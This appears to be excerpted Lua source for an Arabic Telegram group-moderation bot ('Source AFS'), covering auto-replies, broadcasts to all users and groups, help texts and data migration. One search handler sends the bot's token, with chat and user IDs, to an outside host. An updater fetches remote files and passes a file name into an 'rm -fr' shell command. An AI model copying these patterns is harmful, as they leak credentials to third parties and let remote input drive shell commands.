ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS.."ALS:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل اضف رد'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS.."ALS:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل اضف رد'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
--     Source AFS     --
...
Text = "☆︙تم تفعيل الكروب "..dp.title_
local inline = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..msg.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..msg.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..msg.sender_user_id_}},{{text="‹ TeAm AFS ›",url="t.me/CXRCX"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevALS:sadd(AFS.."ALS:Groups",msg.chat_id_)
if not DevALS:get(AFS..'ALS:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevALS:incrby(AFS..'ALS:Sudos'..msg.sender_user_id_,1)
DevALS:set(AFS..'ALS:SudosGp'..msg.sender_user_id_..msg.chat_id_,"ALS")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevALS:sismember(AFS..'ALS:Groups',msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكروب بالتاكيد معطله', 1, 'md')
else
Text = "☆︙تم تعطيل الكروب "..dp.title_
local inline = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..msg.sender_user_id_}},{{text="‹ TeAm AFS ›",url="t.me/CXRCX"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevALS:srem(AFS.."ALS:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
local List = DevALS:smembers(AFS.."ALS:Groups")
if #List == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙ماكو مجموعات مفعله', 1, 'md')
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "☆︙Source AFS\n☆︙File Bot Groups\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevALS:scard(AFS.."ALS:Managers:"..v) or 0
local GroupsAdmins = DevALS:scard(AFS.."ALS:Admins:"..v) or 0
local Groupslink = DevALS:get(AFS.."ALS:Groups:Links" ..v)
...
DevALS:setex(AFS.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(AFS.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(AFS.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevALS:smembers(AFS..'ALS:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
ALSText = "الرساله"
...
DevALS:setex(AFS.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(AFS.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(AFS.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevALS:smembers(AFS..'ALS:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
ALSText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevALS:setex(AFS.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ارسل الرساله الان لتوجيها \n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(AFS.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(AFS.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevALS:smembers(AFS..'ALS:Groups')   
for k,v in pairs(List) do  
...
DevALS:setex(AFS.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ارسل الرساله الان لتوجيها \n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(AFS.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(AFS.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevALS:smembers(AFS..'ALS:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم اذاعة رسالتك بالتوجيه \n☆︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevALS:setex(AFS.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(AFS.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(AFS.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevALS:smembers(AFS.."ALS:Groups") 
if msg.content_.text_ then
...
ALSText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
ALSText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevALS:set(AFS..'ALS:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
ALSText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
ALSText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
ALSText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
ALSText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
ALSText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
ALSText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevALS:set(AFS..'ALS:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevALS:get(AFS..'ALS:Lock:Rd'..msg.chat_id_) then 
...
local List = DevALS:smembers(AFS..'ALS:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ماكو ردود متعدده مضافه" ,  1, "md")
return false
end end
DevALS:set(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevALS:sismember(AFS..'ALS:Manager:GpRedod'..msg.chat_id_,text) then
...
DevALS:set(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevALS:set(AFS..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevALS:set(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevALS:set(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا اوك دزلي الرساله هسه" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevALS:set(AFS..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(AFS..'ALS:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source AFS     --
if text == 'اضف كت' and ChCheck(msg) then
DevALS:set(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevALS:get(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر" ,  1, "md")
DevALS:del(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevALS:set(AFS..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(AFS..'ALS:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     Source AFS     --
...
DevALS:set(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevALS:set(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا اوك دزلي الرساله هسه " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevALS:get(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevALS:set(AFS..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(AFS..'ALS:Manager:GpRed'..msg.chat_id_,text)
DevALS:set(AFS..'DelManagerRep'..msg.chat_id_,text)
keyboard = {} 
...
DevALS:set(AFS.."ALS:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevALS:set(AFS.."ALS:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا اوك دزلي الرساله هسه " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevALS:get(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
...
Text = "☆︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n☆︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevALS:set(AFS.."ALS:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevALS:set(AFS.."ALS:Add:AllText"..msg.sender_user_id_, text)
DevALS:sadd(AFS.."ALS:Sudo:AllRed",text)
DevALS:set(AFS.."DelSudoRep",text)
keyboard = {} 
...
local redod = DevALS:smembers(AFS..'ALS:Manager:GpRedod'..msg.chat_id_)
MsgRep = '☆︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevALS:smembers(AFS..'ALS:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '☆︙ماكو ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == 'حذف الردود المتعدده' or text == 'مسح الردود المتعدده') and ChCheck(msg) then
if not Bot(msg) and DevALS:get(AFS..'ALS:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevALS:del(AFS..'ALS:Text:GpTexts'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevALS:smembers(AFS..'ALS:Manager:GpRed'..msg.chat_id_)
MsgRep = '☆︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevALS:get(AFS.."ALS:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevALS:get(AFS.."ALS:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevALS:get(AFS.."ALS:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevALS:get(AFS.."ALS:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevALS:get(AFS.."ALS:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevALS:get(AFS.."ALS:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevALS:get(AFS.."ALS:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevALS:get(AFS.."ALS:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '*☆︙ماكو ردود مضافه*'
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح ردود المدير",callback_data="/DelGpRed:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
local redod = DevALS:smembers(AFS..'ALS:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ماكو ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevALS:del(AFS..'ALS:Gif:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Voice:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Audio:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Photo:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Stecker:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Video:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:File:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Text:GpRed'..v..msg.chat_id_)
DevALS:del(AFS..'ALS:Manager:GpRed'..msg.chat_id_)
end
...
MsgRep = '☆︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevALS:get(AFS.."ALS:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevALS:get(AFS.."ALS:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevALS:get(AFS.."ALS:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevALS:get(AFS.."ALS:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevALS:get(AFS.."ALS:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevALS:get(AFS.."ALS:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevALS:get(AFS.."ALS:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevALS:get(AFS.."ALS:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
DevALS:set(AFS..'ALS:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevALS:set(AFS..'ALS:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help0'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help0'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help01'..msg.sender_user_id_)
if AFSTeam == 'msg' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help01'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help1', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help21'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help21'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help2', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help31'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help31'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help3', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help41'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help41'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help4', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help51'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help51'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help5', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(AFS..'ALS:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local AFSTeam =  DevALS:get(AFS..'ALS:Help61'..msg.sender_user_id_)
if AFSTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(AFS..'ALS:Help61'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:Help6', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الاساسيين",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="مسح المنشئين",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="مسح المدراء",callback_data="/DelManagers:"..msg.sender_user_id_},{text="مسح الادمنيه",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="مسح المميزين",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الميديا",callback_data="/DelMedia:"..msg.sender_user_id_},{text="مسح الاغاني",callback_data="/DelMusic:"..msg.sender_user_id_}},{{text="مسح الرسائل المعدله",callback_data="/DelMsgEdit:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
local Leave = DevALS:get(AFS..'ALS:Leave')
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="تحديث السورس",callback_data="/UpdateSource:"..msg.sender_user_id_},{text="تحديث الملفات",callback_data="/UpdateFile:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS.."ALS:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل اليوتيوب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevALS:get(AFS.."ALS:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/AFS/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source AFS     --
if SecondSudo(msg) then
...
local Users = DevALS:smembers(AFS.."User_Bot")
local Groups = DevALS:smembers(AFS..'Chek:Groups')
local Sudos = DevALS:smembers(AFS.."Sudo:User")
if DevALS:get(AFS..'Name:Bot') then
DevALS:set(AFS..'ALS:NameBot',(DevALS:get(AFS..'Name:Bot') or 'يوكا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevALS:sadd(AFS..'ALS:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevALS:sadd(AFS..'ALS:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevALS:sadd(AFS..'ALS:Groups',Groups[i]) 
if DevALS:get(AFS.."Private:Group:Link"..Groups[i]) then
DevALS:set(AFS.."ALS:Groups:Links"..Groups[i],DevALS:get(AFS.."Private:Group:Link"..Groups[i]))
end
if DevALS:get(AFS.."Get:Welcome:Group"..Groups[i]) then
DevALS:set(AFS..'ALS:Groups:Welcomes'..Groups[i],DevALS:get(AFS.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevALS:smembers(AFS..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevALS:sadd(AFS.."ALS:Constructor:"..Groups[i], v)
end
local list3 = DevALS:smembers(AFS..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevALS:sadd(AFS.."ALS:BasicConstructor:"..Groups[i], v)
end
local list4 = DevALS:smembers(AFS..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevALS:sadd(AFS.."ALS:Managers:"..Groups[i], v)
end
local list5 = DevALS:smembers(AFS..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevALS:sadd(AFS.."ALS:Admins:"..Groups[i], v)
end
local list6 = DevALS:smembers(AFS..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevALS:sadd(AFS.."ALS:VipMem:"..Groups[i], v)
end
DevALS:set(AFS.."ALS:Lock:Bots"..Groups[i],"del") DevALS:hset(AFS.."ALS:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevALS:set(AFS..Lock..Groups[i],true)
end
end
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/XEX-Murtaza/Files_AFS/main/getfile.json")
if res == 200 then
...
send(msg.chat_id_, msg.id_,"☆︙ماكو اتصال من الـapi") 
end
end
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/XEX-Murtaza/Files_AFS/main/Files_AFS/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
